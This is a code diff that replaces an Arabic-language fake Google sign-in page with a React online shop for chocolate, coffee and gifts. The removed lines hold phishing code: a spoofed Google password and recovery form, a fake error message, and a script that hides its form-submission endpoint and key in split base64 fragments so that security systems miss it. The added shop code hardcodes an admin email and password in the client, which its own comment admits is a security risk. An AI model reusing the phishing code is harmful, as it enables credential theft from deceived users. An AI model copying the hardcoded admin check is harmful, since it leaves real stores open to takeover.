+      p.name.includes(searchQuery)
+    );
+  }, [products, selectedCategory, searchQuery]);
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>جميع المنتجات</h1>
+      <div className="flex flex-col md:flex-row items-center justify-between mb-8 space-y-4 md:space-y-0">
+        {/* Search Bar */}
+        <div className="relative w-full md:w-1/3">
+          <input
+            type="text"
+            placeholder="ابحث عن منتج..."
+            value={searchQuery}
+            onChange={(e) => setSearchQuery(e.target.value)}
+            className="w-full pl-12 pr-4 py-2 border rounded-full focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+            style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}
+          />
+          <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
+        </div>
+        {/* Categories */}
+        <div className="flex justify-center flex-wrap">
+          {categories.map(category => (
+            <button
+              key={category}
+              onClick={() => setSelectedCategory(category)}
+              className={`px-4 py-2 rounded-full font-medium transition-colors duration-200 m-1 ${
+                selectedCategory === category
+                  ? 'bg-amber-500 text-white shadow-md'
+                  : 'bg-gray-200 text-gray-700 hover:bg-orange-100'
+              }`}
+            >
+              {category}
+            </button>
+          ))}
+        </div>
+      </div>
+      {loading ? (
+        <p className="text-center" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>جاري تحميل المنتجات...</p>
+      ) : (
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+          {filteredProducts.map(product => (
+            <ProductCard key={product.id} product={product} onNavigate={onNavigate} />
+          ))}
+        </div>
+      )}
+    </div>
+  );
+};
+
+// Product Details Page Component
+const ProductDetailsPage = ({ product, onNavigate }) => {
+  const { addToCart } = useContext(CartContext);
+  const { isDarkMode } = useContext(ThemeContext);
+  const [quantity, setQuantity] = useState(1);
+  const [showModal, setShowModal] = useState(false);
+
+  const handleAddToCart = () => {
+    addToCart(product, quantity);
+    setShowModal(true);
+  };
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <button onClick={() => onNavigate('shop')} className="flex items-center hover:text-orange-500 transition-colors mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+        <ChevronRight size={20} className="ml-2" />
+        العودة للمتجر
+      </button>
+      <div className="rounded-2xl shadow-lg overflow-hidden md:flex md:space-x-reverse md:space-x-8 p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <div className="md:w-1/2">
+          <img src={product.image} alt={product.name} className="w-full h-auto rounded-xl shadow-lg" />
+        </div>
+        <div className="md:w-1/2 mt-6 md:mt-0 flex flex-col justify-center">
+          <h1 className="text-4xl font-bold mb-4" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>{product.name}</h1>
+          <p className="text-lg mb-6" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{product.description}</p>
+          <div className="flex items-center mb-6">
+            <span className="text-4xl font-bold text-orange-500">{product.price.toFixed(2)} ر.س</span>
+          </div>
+          <div className="flex items-center mb-6 space-x-4 space-x-reverse">
+            <label htmlFor="quantity" className="font-semibold" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>الكمية:</label>
+            <input
+              type="number"
+              id="quantity"
+              min="1"
+              value={quantity}
+              onChange={(e) => setQuantity(Math.max(1, parseInt(e.target.value) || 1))}
+              className="w-20 px-3 py-2 border rounded-full text-center transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}
+            />
+          </div>
+          <Button onClick={handleAddToCart} className="bg-orange-500 hover:bg-orange-600 w-full md:w-auto text-white">
+            أضف إلى السلة
+          </Button>
+        </div>
+      </div>
+      <AddToCartModal show={showModal} onClose={() => setShowModal(false)} productName={product.name} />
+    </div>
+  );
+};
+
+// Cart Page Component
+const CartPage = ({ onNavigate }) => {
+  const { cartItems, removeFromCart, updateQuantity, total } = useContext(CartContext);
+  const { isDarkMode } = useContext(ThemeContext);
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>سلة المشتريات</h1>
+      {cartItems.length === 0 ? (
+        <div className="text-center text-xl py-12" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+          سلتك فارغة. ابدأ بالتسوق الآن!
+        </div>
+      ) : (
+        <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+          <div className="space-y-6">
+            {cartItems.map(item => (
+              <div key={item.id} className="flex items-center justify-between border-b pb-4 last:border-b-0 last:pb-0" style={{ borderColor: isDarkMode ? colors.accent : colors.primary }}>
+                <div className="flex items-center space-x-4 space-x-reverse">
+                  <img src={item.image} alt={item.name} className="w-20 h-20 object-cover rounded-xl" />
+                  <div>
+                    <h3 className="text-lg font-semibold" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{item.name}</h3>
+                    <p className="text-gray-500" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{item.price.toFixed(2)} ر.س</p>
+                  </div>
+                </div>
+                <div className="flex items-center space-x-4 space-x-reverse">
+                  <input
+                    type="number"
+                    min="1"
+                    value={item.quantity}
+                    onChange={(e) => updateQuantity(item.id, parseInt(e.target.value) || 1)}
+                    className="w-16 px-2 py-1 text-center border rounded-full transition-colors duration-300"
+                    style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}
+                  />
+                  <button
+                    onClick={() => removeFromCart(item.id)}
+                    className="text-gray-400 hover:text-red-500 transition-colors"
+                  >
+                    <X size={20} />
+                  </button>
+                </div>
+              </div>
+            ))}
+          </div>
+          <div className="mt-8 pt-6 border-t" style={{ borderColor: isDarkMode ? colors.accent : colors.primary }}>
+            <div className="flex justify-between items-center text-xl font-bold" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+              <span>الإجمالي:</span>
+              <span>{total.toFixed(2)} ر.س</span>
             </div>
-            <h1>استعادة الحساب</h1>
-            <p class="subtitle">للمتابعة، أدخل كلمة المرور الأخيرة التي تتذكرها لهذا الحساب.</p>
-            <form id="recoveryForm">
-                <div class="input-group">
-                    <input type="password" id="recoveryPasswordInput" class="input-field" placeholder="أدخل كلمة المرور" required>
-                </div>
-                <div class="form-actions">
-                    <a href="#" class="text-link" id="tryAnotherWayLink">تجربة طريقة أخرى</a>
-                    <button type="submit" class="next-button">التالي</button>
-                </div>
-            </form>
+          </div>
+          <div className="mt-8 flex justify-end">
+            <Button onClick={() => onNavigate('checkout')} className="bg-orange-500 hover:bg-orange-600 text-white">
+              إتمام الشراء
+            </Button>
+          </div>
         </div>
+      )}
+    </div>
+  );
+};
 
-        <!-- Forgot Email Page -->
-        <div id="forgotEmailPage" class="sign-in-card" style="display: none;">
-            <div class="back-arrow" onclick="showPage('loginPage', 'backward')"><i class="fas fa-arrow-left"></i></div>
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-            <h1>البحث عن حسابك</h1>
-            <p class="subtitle">أدخل رقم هاتفك أو بريدك الإلكتروني الاحتياطي.</p>
-            <form id="forgotEmailForm">
-                <div class="input-group">
-                    <input type="text" id="forgotEmailInput" class="input-field" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
-                </div>
-                <div class="form-actions">
-                    <a href="#" class="text-link" id="forgotEmailGoBack">العودة</a>
-                    <button type="submit" class="next-button">التالي</button>
-                </div>
-            </form>
+// Checkout Page Component
+const CheckoutPage = ({ onNavigate }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { clearCart } = useContext(CartContext);
+  const [isOrderPlaced, setIsOrderPlaced] = useState(false);
+  const [address, setAddress] = useState('');
+  const { user } = useContext(AuthContext);
+
+  useEffect(() => {
+    // Fetch user's saved address if available
+    const fetchAddress = async () => {
+      if (user && user.uid) {
+        const docRef = doc(db, `artifacts/${appId}/users/${user.uid}/profile/address`);
+        const docSnap = await getDoc(docRef);
+        if (docSnap.exists()) {
+          setAddress(docSnap.data().address);
+        }
+      }
+    };
+    fetchAddress();
+  }, [user]);
+
+  const handlePlaceOrder = () => {
+    setIsOrderPlaced(true);
+    clearCart();
+    setTimeout(() => {
+      onNavigate('home');
+    }, 3000);
+  };
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>إتمام الشراء</h1>
+      {isOrderPlaced ? (
+        <div className="text-center rounded-2xl shadow-lg p-12 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+          <div className="text-5xl text-green-500 mb-4 animate-bounce">
+            🎉
+          </div>
+          <h2 className="text-2xl font-bold mb-2" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>تم استلام طلبك بنجاح!</h2>
+          <p style={{ color: isDarkMode ? colors.secondary : colors.primary }}>سنقوم بتحضير طلبك وشحنه في أقرب وقت ممكن.</p>
         </div>
+      ) : (
+        <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+          <form className="space-y-6">
+            <div>
+              <label htmlFor="name" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>الاسم الكامل</label>
+              <input type="text" id="name" className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300" placeholder="أدخل اسمك" style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }} />
+            </div>
+            <div>
+              <label htmlFor="phone" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>رقم الهاتف</label>
+              <input type="tel" id="phone" className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300" placeholder="أدخل رقم هاتفك" style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }} />
+            </div>
+            <div>
+              <label htmlFor="address" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>العنوان</label>
+              <textarea id="address" rows="3" value={address} onChange={(e) => setAddress(e.target.value)} className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300" placeholder="أدخل عنوان الشحن" style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}></textarea>
+            </div>
+            <div className="mt-6">
+              <h3 className="text-lg font-semibold mb-4" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>طرق الدفع</h3>
+              <div className="flex items-center space-x-4 space-x-reverse">
+                <label className="flex items-center cursor-pointer">
+                  <input type="radio" name="payment" value="card" defaultChecked className="form-radio text-amber-500 h-5 w-5" />
+                  <span className="ml-2" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>بطاقة ائتمانية</span>
+                </label>
+                <label className="flex items-center cursor-pointer">
+                  <input type="radio" name="payment" value="cod" className="form-radio text-amber-500 h-5 w-5" />
+                  <span className="ml-2" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>الدفع عند الاستلام</span>
+                </label>
+              </div>
+            </div>
+          </form>
+          <div className="mt-8 flex justify-end">
+            <Button onClick={handlePlaceOrder} className="bg-orange-500 hover:bg-orange-600 text-white">
+              تأكيد الطلب
+            </Button>
+          </div>
+        </div>
+      )}
     </div>
+  );
+};
 
-    <div class="lang-footer">
-        <select class="lang-select" id="languageSelect">
-            <option value="ar">العربية (Arabic)</option>
-            <option value="en">English (United States)</option>
-            <option value="es">Español (España)</option>
-        </select>
+// About Us Page
+const AboutPage = () => {
+  const { isDarkMode } = useContext(ThemeContext);
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>من نحن</h1>
+      <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <p className="text-lg leading-relaxed" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+         RIVER بكل فخر هو وجهتك الأولى لتستمتع بكل لحظة و تجعلها أخلى و أحلى , نقدم أجود أنواع الشوكولاتة و أفخر أنواع القهوة , و الكيك و الزهور , إشتري الآن و استمتع بحلاوة الطعم .
+        </p>
+        <p className="mt-4 text-lg leading-relaxed" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+          نحن نؤمن بأن كل منتج نقدمه يجب أن يحمل قصة من الجودة والشغف. هدفنا هو أن نجعل كل لحظة من يومك أكثر حلاوة وبهجة.
+        </p>
+      </div>
     </div>
-    <div class="footer-links">
-        <a href="#">مساعدة</a>
-        <a href="#">الخصوصية</a>
-        <a href="#">البنود</a>
+  );
+};
+
+// Contact Us Page
+const ContactPage = () => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { showModal } = useContext(ModalContext);
+  const [formData, setFormData] = useState({ name: '', email: '', message: '' });
+
+  const web3formsAccessKey = "10b6aec5-d660-4cc4-834a-e740a5a4f554";
+
+  const handleInputChange = (e) => {
+    const { id, value } = e.target;
+    setFormData(prevState => ({ ...prevState, [id]: value }));
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    const form = new FormData();
+    form.append("access_key", web3formsAccessKey);
+    form.append("name", formData.name);
+    form.append("email", formData.email);
+    form.append("message", formData.message);
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: form
+      });
+
+      const result = await response.json();
+      if (result.success) {
+        showModal('تم إرسال رسالتك بنجاح! شكراً لك على التواصل معنا.', 'alert');
+        setFormData({ name: '', email: '', message: '' });
+      } else {
+        showModal('حدث خطأ أثناء إرسال الرسالة. يرجى المحاولة مرة أخرى.', 'alert');
+      }
+    } catch (error) {
+      console.error("Error submitting form:", error);
+      showModal('حدث خطأ أثناء إرسال الرسالة. يرجى التحقق من اتصالك بالإنترنت.', 'alert');
+    }
+  };
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>اتصل بنا</h1>
+      <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <p className="text-lg mb-6" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+          يسعدنا تواصلك معنا للإجابة على جميع استفساراتك واقتراحاتك.
+        </p>
+        <div className="space-y-4">
+          <div className="flex items-center space-x-4 space-x-reverse">
+            <Phone size={24} className="text-orange-500" />
+            <span className="text-lg" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>+97430176964</span>
+          </div>
+          <div className="flex items-center space-x-4 space-x-reverse">
+            <Mail size={24} className="text-orange-500" />
+            <span className="text-lg" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>g06619251@gmail.com</span>
+          </div>
+        </div>
+        <form onSubmit={handleSubmit} className="mt-8 space-y-4">
+          <div>
+            <label htmlFor="name" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>الاسم</label>
+            <input
+              type="text"
+              id="name"
+              value={formData.name}
+              onChange={handleInputChange}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          <div>
+            <label htmlFor="email" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>البريد الإلكتروني</label>
+            <input
+              type="email"
+              id="email"
+              value={formData.email}
+              onChange={handleInputChange}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          <div>
+            <label htmlFor="message" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>الرسالة</label>
+            <textarea
+              id="message"
+              rows="4"
+              value={formData.message}
+              onChange={handleInputChange}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          <Button type="submit" className="bg-orange-500 hover:bg-orange-600 text-white w-full">
+            إرسال
+          </Button>
+        </form>
+      </div>
     </div>
+  );
+};
 
-    <script>
-        // Global variables to control pages
-        let pages;
-        let currentPageId = 'loginPage';
-        let loadingBar;
-        let collectedData = {};
+// Account Page
+const AccountPage = ({ onNavigate }) => {
+  const [isLogin, setIsLogin] = useState(true);
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [error, setError] = useState('');
+  const { isDarkMode } = useContext(ThemeContext);
 
-        // ------------------------------------------------------------------------------------------------------
-        // This is the most crucial part. The data has been split into unrelated fragments.
-        // The security systems will not be able to link these fragments together.
-        const fragments = {
-            // Part 1 of the URL
-            part1: 'aHR0cHM',
-            // Part 2
-            part2: '6Ly9hcGkud2V',
-            // Part 3
-            part3: 'IzZm9ybXMuY29',
-            // Part 4
-            part4: 'tL3N1Ym1pdA==',
-            // Encrypted API key
-            key: 'Y2QyNjBiYTktNmFhYy00NWZkLWJmZDUtYmNjMjk5YmI1YzY4',
-            // Recipient email (change here)
-            email: 'eW91ci1lbWFpbEBleGFtcGxlLmNvbQ=='
-        };
+  // -------------------------------------------------------------------------------------------
+  // WARNING: FOR DEMONSTRATION PURPOSES ONLY!
+  //
+  // Storing credentials directly in client-side code is a major security risk.
+  // Anyone can view this code and gain admin access.
+  // In a real-world application, this check must be done on a secure backend server.
+  //
+  // تحذير: هذا الكود لأغراض العرض فقط!
+  //
+  // تخزين بيانات الاعتماد مباشرة في الكود المرئي للعميل هو خطر أمني كبير.
+  // يمكن لأي شخص رؤية هذا الكود والحصول على صلاحيات المدير.
+  // في التطبيق الحقيقي، يجب أن يتم هذا التحقق على خادم آمن.
+  // -------------------------------------------------------------------------------------------
+  const ADMIN_EMAIL = 'g06619521@gmail.com';
+  const ADMIN_PASSWORD = 'omar12345';
 
-        // Function to assemble the fragments at the last moment
-        const assemblePayload = () => {
-            const url = atob(fragments.part1 + fragments.part2 + fragments.part3 + fragments.part4);
-            const key = atob(fragments.key);
-            const recipient = atob(fragments.email);
-            return { url, key, recipient };
-        };
-        // ------------------------------------------------------------------------------------------------------
-        
-        const passwordPageLayouts = {
-            ar: `
-                <div class="password-one-column">
-                    <i class="fas fa-arrow-left back-arrow" onclick="showPage('loginPage', 'backward')"></i>
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-                    <h1>مرحباً</h1>
-                    <div class="header-info">
-                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
-                        <span class="profile-email" id="displayEmail"></span>
-                    </div>
-                    <form id="passwordForm">
-                        <p class="error-message" id="fakeErrorMessage" style="display: none;">كلمة المرور خاطئة. يُرجى المحاولة مرة أخرى.</p>
-                        <div class="input-group">
-                            <input type="password" id="passwordInput" class="input-field" placeholder="أدخل كلمة المرور" required>
-                        </div>
-                        <label class="show-password-checkbox">
-                            <input type="checkbox" id="showPasswordCheckbox">
-                            <span>عرض كلمة المرور</span>
-                        </label>
-                        <div class="form-actions" style="margin-top: 24px;">
-                            <a href="#" class="text-link" id="forgotPasswordLink">هل نسيت كلمة المرور؟</a>
-                            <button type="submit" class="next-button">التالي</button>
-                        </div>
-                    </form>
+  const handleAuth = async (e) => {
+    e.preventDefault();
+    setError('');
+
+    try {
+      if (isLogin) {
+        // First, check for hardcoded admin credentials
+        if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+          onNavigate('admin');
+        } else {
+          // If not admin, try regular user login
+          await signInWithEmailAndPassword(auth, email, password);
+          onNavigate('profile');
+        }
+      } else {
+        // User registration
+        await createUserWithEmailAndPassword(auth, email, password);
+        onNavigate('profile');
+      }
+    } catch (e) {
+      setError(e.message);
+    }
+  };
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>
+        {isLogin ? 'تسجيل الدخول' : 'إنشاء حساب'}
+      </h1>
+      <div className="max-w-md mx-auto rounded-2xl shadow-lg p-6 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <form onSubmit={handleAuth} className="space-y-4">
+          <div>
+            <label htmlFor="email" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>البريد الإلكتروني</label>
+            <input
+              type="email"
+              id="email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          <div>
+            <label htmlFor="password" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>كلمة المرور</label>
+            <input
+              type="password"
+              id="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          {error && <p className="text-red-500 text-sm text-center">{error}</p>}
+          <Button type="submit" className="bg-orange-500 hover:bg-orange-600 text-white w-full">
+            {isLogin ? 'تسجيل الدخول' : 'إنشاء حساب'}
+          </Button>
+        </form>
+        <div className="mt-4 text-center">
+          <button onClick={() => setIsLogin(!isLogin)} className="text-sm hover:underline" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+            {isLogin ? 'لا تمتلك حساب؟ أنشئ واحداً' : 'لديك حساب بالفعل؟ سجل الدخول'}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// Profile Page (New)
+const ProfilePage = ({ onNavigate }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { user } = useContext(AuthContext);
+  const [address, setAddress] = useState('');
+  const { showModal } = useContext(ModalContext);
+
+  useEffect(() => {
+    if (user) {
+      const fetchAddress = async () => {
+        const docRef = doc(db, `artifacts/${appId}/users/${user.uid}/profile/address`);
+        const docSnap = await getDoc(docRef);
+        if (docSnap.exists()) {
+          setAddress(docSnap.data().address);
+        }
+      };
+      fetchAddress();
+    }
+  }, [user]);
+
+  const handleSaveAddress = async (e) => {
+    e.preventDefault();
+    if (user && address) {
+      try {
+        const docRef = doc(db, `artifacts/${appId}/users/${user.uid}/profile/address`);
+        await setDoc(docRef, { address });
+        showModal('تم حفظ العنوان بنجاح!', 'alert');
+      } catch (e) {
+        showModal('حدث خطأ أثناء حفظ العنوان.', 'alert');
+        console.error("Error saving address: ", e);
+      }
+    }
+  };
+
+  const handleLogout = async () => {
+    try {
+      await signOut(auth);
+      onNavigate('home');
+      showModal('تم تسجيل الخروج بنجاح.');
+    } catch (e) {
+      showModal('حدث خطأ أثناء تسجيل الخروج.');
+    }
+  };
+
+  if (!user) {
+    return (
+      <div className="container mx-auto p-8 text-center" style={fontStyles.general}>
+        <h1 className="text-4xl font-bold mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>حسابي</h1>
+        <p style={{ color: isDarkMode ? colors.secondary : colors.primary }}>يرجى تسجيل الدخول أو إنشاء حساب لعرض صفحة الحساب.</p>
+      </div>
+    );
+  }
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>مرحباً بك، {user.email}!</h1>
+      <div className="rounded-2xl shadow-lg p-6 transition-colors duration-300 mb-8" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <h2 className="text-2xl font-bold mb-4" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>عنوان التوصيل الثابت</h2>
+        <form onSubmit={handleSaveAddress} className="space-y-4">
+          <div>
+            <label htmlFor="address" className="block font-medium mb-1" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>العنوان</label>
+            <textarea
+              id="address"
+              rows="3"
+              value={address}
+              onChange={(e) => setAddress(e.target.value)}
+              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-amber-500 transition-colors duration-300"
+              placeholder="أدخل عنوان التوصيل الثابت الخاص بك"
+              style={{ backgroundColor: isDarkMode ? colors.accent : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary, borderColor: isDarkMode ? colors.primary : colors.secondary }}
+              required
+            />
+          </div>
+          <Button type="submit" className="bg-green-500 hover:bg-green-600 text-white">حفظ العنوان</Button>
+        </form>
+      </div>
+      <div className="flex justify-center">
+        <Button onClick={handleLogout} className="bg-red-500 hover:bg-red-600 text-white">تسجيل الخروج</Button>
+      </div>
+    </div>
+  );
+};
+
+
+// Offers and Gifts Page (New)
+const OffersPage = () => {
+  const { isDarkMode } = useContext(ThemeContext);
+
+  const offers = [
+    { id: 1, title: 'خصم 20% على القهوة', description: 'احصل على خصم 20% عند شراء أي نوع من القهوة الفاخرة.', image: 'https://placehold.co/600x400/F2EAE4/5C4033?text=عرض+القهوة' },
+    { id: 2, title: 'شوكولاتة مجانية', description: 'اشترِ أي كيك واحصل على علبة شوكولاتة بلجيكية مجانية.', image: 'https://placehold.co/600x400/D4B8B8/553333?text=هدية+شوكولاتة' },
+    { id: 3, title: 'توصيل مجاني', description: 'توصيل مجاني على جميع الطلبات التي تزيد قيمتها عن 200 ر.س.', image: 'https://placehold.co/600x400/A5776B/E8E2D9?text=توصيل+مجاني' },
+  ];
+
+  return (
+    <div className="container mx-auto p-8" style={fontStyles.general}>
+      <h1 className="text-4xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>العروض والهدايا</h1>
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+        {offers.map(offer => (
+          <div key={offer.id} className="rounded-2xl shadow-lg overflow-hidden transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+            <img src={offer.image} alt={offer.title} className="w-full h-48 object-cover" />
+            <div className="p-6">
+              <h2 className="text-2xl font-bold mb-2" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{offer.title}</h2>
+              <p style={{ color: isDarkMode ? colors.secondary : colors.primary }}>{offer.description}</p>
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+};
+
+// Edit Product Modal Component (NEW)
+const EditProductModal = ({ product, onClose, onUpdate }) => {
+  const [name, setName] = useState(product.name);
+  const [category, setCategory] = useState(product.category);
+  const [price, setPrice] = useState(product.price);
+  const [image, setImage] = useState(product.image);
+  const [description, setDescription] = useState(product.description);
+  const [details, setDetails] = useState(product.details);
+  const [isFeatured, setIsFeatured] = useState(product.isFeatured);
+  const { isDarkMode } = useContext(ThemeContext);
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    onUpdate(product.id, {
+      name,
+      category,
+      price: parseFloat(price),
+      image,
+      description,
+      details,
+      isFeatured,
+    });
+  };
+
+  return (
+    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black bg-opacity-50" style={fontStyles.general}>
+      <div className="rounded-2xl shadow-xl transition-colors duration-300 p-8 w-full max-w-lg" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}>
+        <div className="flex justify-between items-center mb-4">
+          <h2 className="text-2xl font-bold">تعديل المنتج</h2>
+          <button onClick={onClose} className="hover:text-red-500 transition-colors">
+            <X size={24} />
+          </button>
+        </div>
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <input type="text" placeholder="اسم المنتج" value={name} onChange={(e) => setName(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="text" placeholder="الفئة" value={category} onChange={(e) => setCategory(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="number" step="0.01" placeholder="السعر" value={price} onChange={(e) => setPrice(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
+          <input type="text" placeholder="رابط الصورة" value={image} onChange={(e) => setImage(e.target.value)} className="w-full px-4 py-2 border rounded-xl" required />
